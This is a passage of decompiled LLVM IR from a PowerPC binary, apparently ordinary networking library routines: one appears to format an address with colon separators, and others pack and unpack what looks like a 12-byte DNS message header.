  store i1 %v3_100138106, i1* %cr7_eq.global-to-local, align 1
  %v2_10013880 = icmp slt i32 %tmp, 65535
  %v4_10013880 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10013810

dec_label_pc_10013810:                            ; preds = %dec_label_pc_10013804, %dec_label_pc_100138dc
  %v2_1001384c = phi i32 [ %v2_10013804, %dec_label_pc_10013804 ], [ %v2_1001383451, %dec_label_pc_100138dc ]
  %v0_10013820 = phi i32 [ %v0_100138103, %dec_label_pc_10013804 ], [ %v0_10013810, %dec_label_pc_100138dc ]
  %v0_10013840 = phi i32 [ 0, %dec_label_pc_10013804 ], [ %v1_100138dc, %dec_label_pc_100138dc ]
  %v3_100138107 = phi i1 [ %v3_100138106, %dec_label_pc_10013804 ], [ %v3_10013810, %dec_label_pc_100138dc ]
  br i1 %v3_100138107, label %dec_label_pc_10013840, label %dec_label_pc_10013818

dec_label_pc_10013818:                            ; preds = %dec_label_pc_10013810
  %v2_10013818 = icmp slt i32 %v0_10013840, %v0_10013820
  %v4_10013818 = icmp eq i32 %v0_10013840, %v0_10013820
  br i1 %v2_10013818, label %dec_label_pc_10013840, label %dec_label_pc_10013820

dec_label_pc_10013820:                            ; preds = %dec_label_pc_10013818
  %v1_10013820 = load i32, i32* @r30, align 4
  %v2_10013820 = add i32 %v1_10013820, %v0_10013820
  %v2_10013824 = icmp slt i32 %v0_10013840, %v2_10013820
  %v4_10013824 = icmp eq i32 %v0_10013840, %v2_10013820
  store i1 %v2_10013824, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013824, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10013824, label %dec_label_pc_1001382c, label %dec_label_pc_10013840

dec_label_pc_1001382c:                            ; preds = %dec_label_pc_10013820
  br i1 %v4_10013818, label %dec_label_pc_10013830, label %dec_label_pc_100138dc

dec_label_pc_10013830:                            ; preds = %dec_label_pc_1001382c
  %v3_10013834 = inttoptr i32 %v2_1001384c to i8*
  store i8 58, i8* %v3_10013834, align 1
  %v0_10013838 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013838 = add i32 %v0_10013838, 1
  store i32 %v1_10013838, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100138dc

dec_label_pc_10013840:                            ; preds = %dec_label_pc_10013820, %dec_label_pc_10013818, %dec_label_pc_10013810
  %v1_10013840 = icmp slt i32 %v0_10013840, 0
  %v3_10013840 = icmp eq i32 %v0_10013840, 0
  store i1 %v1_10013840, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013840, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013840, label %dec_label_pc_10013854.thread, label %dec_label_pc_10013854

dec_label_pc_10013854.thread:                     ; preds = %dec_label_pc_10013840
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100138b8

dec_label_pc_10013854:                            ; preds = %dec_label_pc_10013840
  %v3_1001384c = inttoptr i32 %v2_1001384c to i8*
  store i8 58, i8* %v3_1001384c, align 1
  %v0_10013850 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013850 = add i32 %v0_10013850, 1
  store i32 %v1_10013850, i32* %r29.global-to-local, align 4
  %v0_10013854.pre = load i32, i32* @r31, align 4
  %v1_10013854 = icmp slt i32 %v0_10013854.pre, 6
  %v3_10013854 = icmp eq i32 %v0_10013854.pre, 6
  store i1 %v1_10013854, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013854, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013854, label %dec_label_pc_1001385c, label %dec_label_pc_100138b8

dec_label_pc_1001385c:                            ; preds = %dec_label_pc_10013854
  %v0_1001385c = load i32, i32* @r28, align 4
  %v1_1001385c = icmp slt i32 %v0_1001385c, 0
  %v3_1001385c = icmp eq i32 %v0_1001385c, 0
  store i1 %v1_1001385c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001385c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001385c, label %dec_label_pc_10013864, label %dec_label_pc_100138b8

dec_label_pc_10013864:                            ; preds = %dec_label_pc_1001385c
  %v0_10013864 = load i32, i32* @r30, align 4
  %v1_10013864 = icmp slt i32 %v0_10013864, 6
  %v3_10013864 = icmp eq i32 %v0_10013864, 6
  store i1 %v1_10013864, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013864, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013864, label %dec_label_pc_10013888, label %dec_label_pc_1001386c

dec_label_pc_1001386c:                            ; preds = %dec_label_pc_10013864
  %v1_1001386c = icmp slt i32 %v0_10013864, 5
  %v3_1001386c = icmp eq i32 %v0_10013864, 5
  store i1 %v1_1001386c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001386c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001386c, label %dec_label_pc_10013874, label %dec_label_pc_100138b8

dec_label_pc_10013874:                            ; preds = %dec_label_pc_1001386c
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10013880, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013880, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10013880, label %dec_label_pc_10013888, label %dec_label_pc_100138b8

dec_label_pc_10013888:                            ; preds = %dec_label_pc_10013874, %dec_label_pc_10013864
  %v1_10013888 = load i32, i32* @r1, align 4
  %v2_10013888 = sub i32 %v1_10013888, %v1_10013850
  %v0_1001388c = load i32, i32* @r27, align 4
  %v1_1001388c = add i32 %v0_1001388c, 12
  %v1_10013890 = add i32 %v2_10013888, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1001389c.850 to i32), i32* @lr, align 4
  %v3_10013898 = call i32 @function_1001356c(i32 %v1_1001388c, i32 %v1_10013850, i32 %v1_10013890)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_100138a0 = icmp slt i32 %v3_10013898, 0
  %v3_100138a0 = icmp eq i32 %v3_10013898, 0
  store i1 %v1_100138a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100138a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100138a0, label %dec_label_pc_10013958, label %dec_label_pc_100138a8

dec_label_pc_100138a8:                            ; preds = %dec_label_pc_10013888
  %v0_100138a8 = load i32, i32* @r29, align 4
  store i32 %v0_100138a8, i32* @r3, align 4
  %v0_100138ac = call i32 @function_1000df60()
  %v0_100138b0 = load i32, i32* @r29, align 4
  %v2_100138b0 = add i32 %v0_100138b0, %v0_100138ac
  store i32 %v2_100138b0, i32* %r29.global-to-local, align 4
  %v0_100138f0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100138f0

dec_label_pc_100138b8:                            ; preds = %dec_label_pc_10013854.thread, %dec_label_pc_10013874, %dec_label_pc_1001386c, %dec_label_pc_1001385c, %dec_label_pc_10013854
  %v0_100138b867 = phi i32 [ 0, %dec_label_pc_10013854.thread ], [ 6, %dec_label_pc_10013874 ], [ 6, %dec_label_pc_1001386c ], [ 6, %dec_label_pc_1001385c ], [ %v0_10013854.pre, %dec_label_pc_10013854 ]
  %v0_1001389466 = phi i32 [ %v2_1001384c, %dec_label_pc_10013854.thread ], [ %v1_10013850, %dec_label_pc_10013874 ], [ %v1_10013850, %dec_label_pc_1001386c ], [ %v1_10013850, %dec_label_pc_1001385c ], [ %v1_10013850, %dec_label_pc_10013854 ]
  %v1_100138b8 = mul i32 %v0_100138b867, 4
  store i32 %v2_10013710, i32* %r9.global-to-local, align 4
  %v2_100138c0 = add i32 %v1_100138b8, %v2_10013710
  %v3_100138c0 = inttoptr i32 %v2_100138c0 to i32*
  %v4_100138c0 = load i32, i32* %v3_100138c0, align 4
  store i32 %v0_1001389466, i32* @r3, align 4
  store i32 268515544, i32* @lr, align 4
  %v5_100138d4 = load i32, i32* @r7, align 4
  %v6_100138d4 = load i32, i32* @r8, align 4
  %v9_100138d4 = call i32 @function_1000c868(i32 %v0_1001389466, i32 ptrtoint ([3 x i8]* @global_var_1001a56c.851 to i32), i32 %v4_100138c0, i32 %v2_10013710, i32 %v5_100138d4, i32 %v6_100138d4, i32 %v2_10013710, i32 ptrtoint (i32* @0 to i32))
  %v0_100138d8 = load i32, i32* @r29, align 4
  %v2_100138d8 = add i32 %v0_100138d8, %v9_100138d4
  store i32 %v2_100138d8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100138dc

dec_label_pc_100138dc:                            ; preds = %dec_label_pc_1001382c, %dec_label_pc_10013830, %dec_label_pc_100138b8
  %v2_1001383451 = phi i32 [ %v2_1001384c, %dec_label_pc_1001382c ], [ %v1_10013838, %dec_label_pc_10013830 ], [ %v2_100138d8, %dec_label_pc_100138b8 ]
  %v0_100138dc = load i32, i32* @r31, align 4
  %v1_100138dc = add i32 %v0_100138dc, 1
  store i32 %v1_100138dc, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_100138dc, 8
  %v0_10013810 = load i32, i32* @r28, align 4
  %v1_10013810 = icmp slt i32 %v0_10013810, -1
  %v3_10013810 = icmp eq i32 %v0_10013810, -1
  store i1 %v1_10013810, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10013810, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10013810, label %dec_label_pc_100138e8

dec_label_pc_100138e8:                            ; preds = %dec_label_pc_100138dc
  br i1 %v3_10013810, label %dec_label_pc_10013908, label %dec_label_pc_100138f0

dec_label_pc_100138f0:                            ; preds = %dec_label_pc_100138e8, %dec_label_pc_100138a8
  %v2_10013900 = phi i32 [ %v2_1001383451, %dec_label_pc_100138e8 ], [ %v2_100138b0, %dec_label_pc_100138a8 ]
  %v0_100138f0 = phi i32 [ %v0_10013810, %dec_label_pc_100138e8 ], [ %v0_100138f0.pre, %dec_label_pc_100138a8 ]
  %v1_100138f0 = load i32, i32* @r30, align 4
  %v2_100138f0 = add i32 %v1_100138f0, %v0_100138f0
  %v1_100138f4 = icmp slt i32 %v2_100138f0, 8
  %v3_100138f4 = icmp eq i32 %v2_100138f0, 8
  store i1 %v1_100138f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100138f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100138f4, label %dec_label_pc_100138fc, label %dec_label_pc_10013908

dec_label_pc_100138fc:                            ; preds = %dec_label_pc_100138f0
  %v3_10013900 = inttoptr i32 %v2_10013900 to i8*
  store i8 58, i8* %v3_10013900, align 1
  %v0_10013904 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013904 = add i32 %v0_10013904, 1
  store i32 %v1_10013904, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013908

dec_label_pc_10013908:                            ; preds = %dec_label_pc_100138f0, %dec_label_pc_100138e8, %dec_label_pc_100138fc
  %v2_1001391c = phi i32 [ %v2_10013900, %dec_label_pc_100138f0 ], [ %v2_1001383451, %dec_label_pc_100138e8 ], [ %v1_10013904, %dec_label_pc_100138fc ]
  %v1_10013908 = sub i32 1, %v2_10013804
  %v2_10013910 = add i32 %v1_10013908, %v2_1001391c
  %v1_10013914 = load i32, i32* @r26, align 4
  %v2_10013914 = icmp ult i32 %v2_10013910, %v1_10013914
  %v4_10013914 = icmp eq i32 %v2_10013910, %v1_10013914
  store i1 %v2_10013914, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10013914, i1* %cr7_eq.global-to-local, align 1
  %v3_1001391c = inttoptr i32 %v2_1001391c to i8*
  store i8 0, i8* %v3_1001391c, align 1
  %v0_10013920 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10013920 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10013920 = or i1 %v0_10013920, %v1_10013920
  br i1 %v2_10013920, label %dec_label_pc_10013938, label %dec_label_pc_10013924

dec_label_pc_10013924:                            ; preds = %dec_label_pc_10013908
  %v0_10013924 = call i32 @function_1000c85c()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013930 = inttoptr i32 %v0_10013924 to i32*
  store i32 28, i32* %v2_10013930, align 4
  %v0_1001395c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013958

dec_label_pc_10013938:                            ; preds = %dec_label_pc_10013908
  %v0_10013938 = load i32, i32* @r25, align 4
  %v2_1001393c = bitcast i32* %stack_var_-88 to i8*
  %v3_1001393c = call i32 @function_1000df40(i32 %v0_10013938, i8* %v2_1001393c)
  br label %dec_label_pc_10013940

dec_label_pc_10013940:                            ; preds = %dec_label_pc_100136fc, %dec_label_pc_10013938
  %storemerge1 = phi i32 [ %v3_10013708, %dec_label_pc_100136fc ], [ %v3_1001393c, %dec_label_pc_10013938 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013958

dec_label_pc_10013948:                            ; preds = %dec_label_pc_100136f0
  %v0_10013948 = call i32 @function_1000c85c()
  %v2_10013950 = inttoptr i32 %v0_10013948 to i32*
  store i32 97, i32* %v2_10013950, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013958

dec_label_pc_10013958:                            ; preds = %dec_label_pc_10013888, %dec_label_pc_10013940, %dec_label_pc_10013924, %dec_label_pc_10013948
  %v0_1001395c = phi i32 [ 0, %dec_label_pc_10013888 ], [ %storemerge1, %dec_label_pc_10013940 ], [ %v0_1001395c.pre, %dec_label_pc_10013924 ], [ 0, %dec_label_pc_10013948 ]
  ret i32 %v0_1001395c

; uselistorder directives
  uselistorder i32 %v2_1001391c, { 1, 0 }
  uselistorder i32 %v2_100138f0, { 1, 0 }
  uselistorder i1 %v3_10013810, { 0, 2, 1 }
  uselistorder i32 %v0_10013810, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100138dc, { 2, 1, 0 }
  uselistorder i32 %v0_1001389466, { 1, 0 }
  uselistorder i32 %v3_10013898, { 1, 0 }
  uselistorder i32 %v0_10013864, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013854.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10013850, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10013820, { 1, 0 }
  uselistorder i32 %v0_10013840, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10013820, { 0, 2, 1 }
  uselistorder i32 %v2_1001384c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100138103, { 0, 2, 1 }
  uselistorder i32 %v0_100137f8, { 2, 1, 0 }
  uselistorder i32 %v0_100137e8.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_100137f0, { 1, 0, 2 }
  uselistorder i32 %v1_100137cc, { 2, 1, 0 }
  uselistorder i32 %v1_100137c8, { 1, 0 }
  uselistorder i32 %v0_100137ac39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_100137bc42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10013780, { 1, 0 }
  uselistorder i32 %v0_100137c8, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10013780, { 1, 0 }
  uselistorder i32 %v0_100137ac, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_100137bc, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1001375c, { 1, 0 }
  uselistorder i32 %v2_10013754, { 1, 0 }
  uselistorder i32 %v0_1001374c, { 1, 0, 2 }
  uselistorder i32 %v1_10013734, { 1, 0 }
  uselistorder i32 %v2_10013710, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i32 97, { 4, 5, 9, 8, 6, 0, 7, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_1000c868, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 57, 58, 59, 60, 39, 40, 62, 63, 64, 61, 41, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0, 56, 3, 4 }
  uselistorder i32* @r7, { 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 37, 38, 39, 8, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 3, 34, 7, 4, 5, 35, 36, 9, 10 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 10, 0, 11, 12, 13, 7, 8, 9, 5, 6, 14 }
  uselistorder i1 true, { 1, 3, 5, 4, 0, 2 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_1000dd4c, { 24, 23, 7, 2, 5, 4, 15, 0, 11, 1, 14, 22, 21, 20, 19, 18, 17, 16, 3, 13, 12, 6, 10, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @function_1001356c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10013958, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10013940, { 1, 0 }
  uselistorder label %dec_label_pc_10013908, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100138dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100138b8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10013810, { 1, 0 }
  uselistorder label %dec_label_pc_10013804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100137e8, { 1, 0 }
  uselistorder label %dec_label_pc_100137c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100137c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001377c, { 1, 0 }
  uselistorder label %dec_label_pc_10013734, { 1, 0 }
}

define i32 @function_10013970(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10013970:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r6.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10013a54, label %dec_label_pc_1001397c

dec_label_pc_1001397c:                            ; preds = %dec_label_pc_10013970
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1001397c = add i32 %tmp, 2
  %v2_1001397c = inttoptr i32 %v1_1001397c to i8*
  %v3_1001397c = load i8, i8* %v2_1001397c, align 1
  store i32 12, i32* %r6.global-to-local, align 4
  store i8 %v3_1001397c, i8* %tmp3, align 1
  %v2_10013988 = load i32, i32* %arg1, align 4
  %v1_1001398c = trunc i32 %v2_10013988 to i8
  %v4_1001398c = add i32 %arg2, 1
  %v5_1001398c = inttoptr i32 %v4_1001398c to i8*
  store i8 %v1_1001398c, i8* %v5_1001398c, align 1
  %v1_10013990 = add i32 %tmp, 12
  %v2_10013990 = inttoptr i32 %v1_10013990 to i32*
  %v3_10013990 = load i32, i32* %v2_10013990, align 4
  %v1_10013994 = add i32 %tmp, 16
  %v2_10013994 = inttoptr i32 %v1_10013994 to i32*
  %v3_10013994 = load i32, i32* %v2_10013994, align 4
  store i32 %v3_10013994, i32* %r11.global-to-local, align 4
  %v1_10013998 = add i32 %tmp, 4
  %v2_10013998 = inttoptr i32 %v1_10013998 to i32*
  %v3_10013998 = load i32, i32* %v2_10013998, align 4
  %v1_1001399c = add i32 %tmp, 8
  %v2_1001399c = inttoptr i32 %v1_1001399c to i32*
  %v3_1001399c = load i32, i32* %v2_1001399c, align 4
  %v1_100139a0 = add i32 %tmp, 20
  %v2_100139a0 = inttoptr i32 %v1_100139a0 to i32*
  %v3_100139a0 = load i32, i32* %v2_100139a0, align 4
  store i32 %v3_100139a0, i32* %r7.global-to-local, align 4
  %v2_100139a4 = icmp ne i32 %v3_10013990, 0
  %v5_100139a8 = zext i1 %v2_100139a4 to i32
  store i32 %v5_100139a8, i32* %r10.global-to-local, align 4
  %not.v2_100139ac = icmp eq i32 %v3_10013998, 0
  %v6_100139b0 = sext i1 %not.v2_100139ac to i32
  %v2_100139b4 = icmp ne i32 %v3_10013994, 0
  %v5_100139b8 = zext i1 %v2_100139b4 to i32
  store i32 %v5_100139b8, i32* %r11.global-to-local, align 4
  %v1_100139c0 = call i32 @__asm_rlwinm(i32 %v6_100139b0, i32 0, i32 24, i32 24)
  %v0_100139c4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100139c4 = mul i32 %v0_100139c4, 4
  store i32 %v1_100139c4, i32* %r10.global-to-local, align 4
  %v1_100139c8 = call i32 @__asm_rlwinm(i32 %v3_1001399c, i32 3, i32 25, i32 28)
  %v1_100139cc = add i32 %v1_100139c0, 128
  %v0_100139d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_100139d0 = icmp ne i32 %v0_100139d0, 0
  %v5_100139d4 = zext i1 %v2_100139d0 to i32
  %v2_100139d8 = or i32 %v1_100139c4, %v1_100139c8
  store i32 %v2_100139d8, i32* %r10.global-to-local, align 4
  %v0_100139dc = load i32, i32* %r11.global-to-local, align 4
  %v1_100139dc = mul i32 %v0_100139dc, 2
  store i32 %v1_100139dc, i32* %r11.global-to-local, align 4
  %v2_100139e0 = or i32 %v2_100139d8, %v5_100139d4
  %v2_100139e4 = or i32 %v2_100139e0, %v1_100139cc
  %v2_100139e8 = or i32 %v2_100139e4, %v1_100139dc
  %v1_100139ec = trunc i32 %v2_100139e8 to i8
  %v4_100139ec = add i32 %arg2, 2
  %v5_100139ec = inttoptr i32 %v4_100139ec to i8*
  store i8 %v1_100139ec, i8* %v5_100139ec, align 1
  %v1_100139f0 = add i32 %tmp, 24
  %v2_100139f0 = inttoptr i32 %v1_100139f0 to i32*
  %v3_100139f0 = load i32, i32* %v2_100139f0, align 4
  %v1_100139f4 = add i32 %tmp, 28
  %v2_100139f4 = inttoptr i32 %v1_100139f4 to i32*
  %v3_100139f4 = load i32, i32* %v2_100139f4, align 4
  %not.v2_100139f8 = icmp eq i32 %v3_100139f0, 0
  %v6_100139fc = sext i1 %not.v2_100139f8 to i32
  %v1_10013a00 = call i32 @__asm_rlwinm(i32 %v6_100139fc, i32 0, i32 24, i32 24)
  %v1_10013a04 = urem i32 %v3_100139f4, 16
  %v1_10013a08 = add i32 %v1_10013a00, 128
  %v2_10013a0c = or i32 %v1_10013a04, %v1_10013a08
  %v1_10013a10 = trunc i32 %v2_10013a0c to i8
  %v4_10013a10 = add i32 %arg2, 3
  %v5_10013a10 = inttoptr i32 %v4_10013a10 to i8*
  store i8 %v1_10013a10, i8* %v5_10013a10, align 1
  %v1_10013a14 = add i32 %tmp, 34
  %v2_10013a14 = inttoptr i32 %v1_10013a14 to i8*
  %v3_10013a14 = load i8, i8* %v2_10013a14, align 1
  %v4_10013a18 = add i32 %arg2, 4
  %v5_10013a18 = inttoptr i32 %v4_10013a18 to i8*
  store i8 %v3_10013a14, i8* %v5_10013a18, align 1
  %v1_10013a1c = add i32 %tmp, 32
  %v2_10013a1c = inttoptr i32 %v1_10013a1c to i32*
  %v3_10013a1c = load i32, i32* %v2_10013a1c, align 4
  %v1_10013a20 = trunc i32 %v3_10013a1c to i8
  %v4_10013a20 = add i32 %arg2, 5
  %v5_10013a20 = inttoptr i32 %v4_10013a20 to i8*
  store i8 %v1_10013a20, i8* %v5_10013a20, align 1
  %v1_10013a24 = add i32 %tmp, 38
  %v2_10013a24 = inttoptr i32 %v1_10013a24 to i8*
  %v3_10013a24 = load i8, i8* %v2_10013a24, align 1
  %v4_10013a28 = add i32 %arg2, 6
  %v5_10013a28 = inttoptr i32 %v4_10013a28 to i8*
  store i8 %v3_10013a24, i8* %v5_10013a28, align 1
  %v1_10013a2c = add i32 %tmp, 36
  %v2_10013a2c = inttoptr i32 %v1_10013a2c to i32*
  %v3_10013a2c = load i32, i32* %v2_10013a2c, align 4
  %v1_10013a30 = trunc i32 %v3_10013a2c to i8
  %v4_10013a30 = add i32 %arg2, 7
  %v5_10013a30 = inttoptr i32 %v4_10013a30 to i8*
  store i8 %v1_10013a30, i8* %v5_10013a30, align 1
  %v1_10013a34 = add i32 %tmp, 42
  %v2_10013a34 = inttoptr i32 %v1_10013a34 to i8*
  %v3_10013a34 = load i8, i8* %v2_10013a34, align 1
  %v4_10013a38 = add i32 %arg2, 8
  %v5_10013a38 = inttoptr i32 %v4_10013a38 to i8*
  store i8 %v3_10013a34, i8* %v5_10013a38, align 1
  %v1_10013a3c = add i32 %tmp, 40
  %v2_10013a3c = inttoptr i32 %v1_10013a3c to i32*
  %v3_10013a3c = load i32, i32* %v2_10013a3c, align 4
  %v1_10013a40 = trunc i32 %v3_10013a3c to i8
  %v4_10013a40 = add i32 %arg2, 9
  %v5_10013a40 = inttoptr i32 %v4_10013a40 to i8*
  store i8 %v1_10013a40, i8* %v5_10013a40, align 1
  %v1_10013a44 = add i32 %tmp, 46
  %v2_10013a44 = inttoptr i32 %v1_10013a44 to i8*
  %v3_10013a44 = load i8, i8* %v2_10013a44, align 1
  %v4_10013a48 = add i32 %arg2, 10
  %v5_10013a48 = inttoptr i32 %v4_10013a48 to i8*
  store i8 %v3_10013a44, i8* %v5_10013a48, align 1
  %v1_10013a4c = add i32 %tmp, 44
  %v2_10013a4c = inttoptr i32 %v1_10013a4c to i32*
  %v3_10013a4c = load i32, i32* %v2_10013a4c, align 4
  %v1_10013a50 = trunc i32 %v3_10013a4c to i8
  %v4_10013a50 = add i32 %arg2, 11
  %v5_10013a50 = inttoptr i32 %v4_10013a50 to i8*
  store i8 %v1_10013a50, i8* %v5_10013a50, align 1
  %v0_10013a54.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10013a54

dec_label_pc_10013a54:                            ; preds = %dec_label_pc_10013970, %dec_label_pc_1001397c
  %v0_10013a54 = phi i32 [ -1, %dec_label_pc_10013970 ], [ %v0_10013a54.pre, %dec_label_pc_1001397c ]
  ret i32 %v0_10013a54

; uselistorder directives
  uselistorder i32 %v1_100139dc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 13, 1, 6, 9, 8, 12, 11, 10, 3, 2, 5, 4, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 38, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10013a54, { 1, 0 }
}

define i32 @function_10013a5c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10013a5c:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10013a5c = load i8, i8* %arg1, align 1
  %v4_10013a5c = zext i8 %v3_10013a5c to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10013a64 = add i32 %tmp, 1
  %v3_10013a64 = inttoptr i32 %v2_10013a64 to i8*
  %v4_10013a64 = load i8, i8* %v3_10013a64, align 1
  %v5_10013a64 = zext i8 %v4_10013a64 to i32
  %v1_10013a6c = mul nuw nsw i32 %v4_10013a5c, 256
  %v2_10013a70 = or i32 %v5_10013a64, %v1_10013a6c
  %v2_10013a74 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10013a70, i32* %v2_10013a74, align 4
  %v0_10013a78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a78 = add i32 %v0_10013a78, 2
  %v2_10013a78 = inttoptr i32 %v1_10013a78 to i8*
  %v3_10013a78 = load i8, i8* %v2_10013a78, align 1
  %v4_10013a78 = zext i8 %v3_10013a78 to i32
  %v1_10013a7c = call i32 @__asm_rlwinm(i32 %v4_10013a78, i32 25, i32 31, i32 31)
  %v2_10013a80 = add i32 %arg2, 4
  %v3_10013a80 = inttoptr i32 %v2_10013a80 to i32*
  store i32 %v1_10013a7c, i32* %v3_10013a80, align 4
  %v0_10013a84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a84 = add i32 %v0_10013a84, 2
  %v2_10013a84 = inttoptr i32 %v1_10013a84 to i8*
  %v3_10013a84 = load i8, i8* %v2_10013a84, align 1
  %v4_10013a84 = zext i8 %v3_10013a84 to i32
  %v1_10013a88 = call i32 @__asm_rlwinm(i32 %v4_10013a84, i32 29, i32 28, i32 31)
  %v2_10013a8c = add i32 %arg2, 8
  %v3_10013a8c = inttoptr i32 %v2_10013a8c to i32*
  store i32 %v1_10013a88, i32* %v3_10013a8c, align 4
  %v0_10013a90 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a90 = add i32 %v0_10013a90, 2
  %v2_10013a90 = inttoptr i32 %v1_10013a90 to i8*
  %v3_10013a90 = load i8, i8* %v2_10013a90, align 1
  %v4_10013a90 = zext i8 %v3_10013a90 to i32
  %v1_10013a94 = call i32 @__asm_rlwinm(i32 %v4_10013a90, i32 30, i32 31, i32 31)
  %v2_10013a98 = add i32 %arg2, 12
  %v3_10013a98 = inttoptr i32 %v2_10013a98 to i32*
  store i32 %v1_10013a94, i32* %v3_10013a98, align 4
  %v0_10013a9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a9c = add i32 %v0_10013a9c, 2
  %v2_10013a9c = inttoptr i32 %v1_10013a9c to i8*
  %v3_10013a9c = load i8, i8* %v2_10013a9c, align 1
